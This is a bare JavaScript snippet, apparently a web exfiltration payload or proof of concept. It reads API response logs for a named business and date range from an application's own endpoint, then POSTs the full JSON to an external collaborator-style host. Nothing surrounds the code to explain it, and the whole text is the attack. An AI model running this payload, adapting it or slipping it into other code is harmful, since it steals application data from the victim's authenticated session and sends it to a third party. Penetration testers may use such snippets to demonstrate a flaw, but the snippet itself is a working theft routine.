fetch('/api/ApiResponceLogs/GetApiResponceLogs?BusinessName=3090&WorkflowName=&CaseId=&FromDate=10/28/2025&ToDate=10/28/2025&{}')
  .then(r => r.json())
  .then(data => fetch('https://3rvc8c55nzwl67mklxnntlm3kuqleb20.collab.hawkislandsol.com/bigeye', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  }))
  .catch(err => console.error('Error:', err));
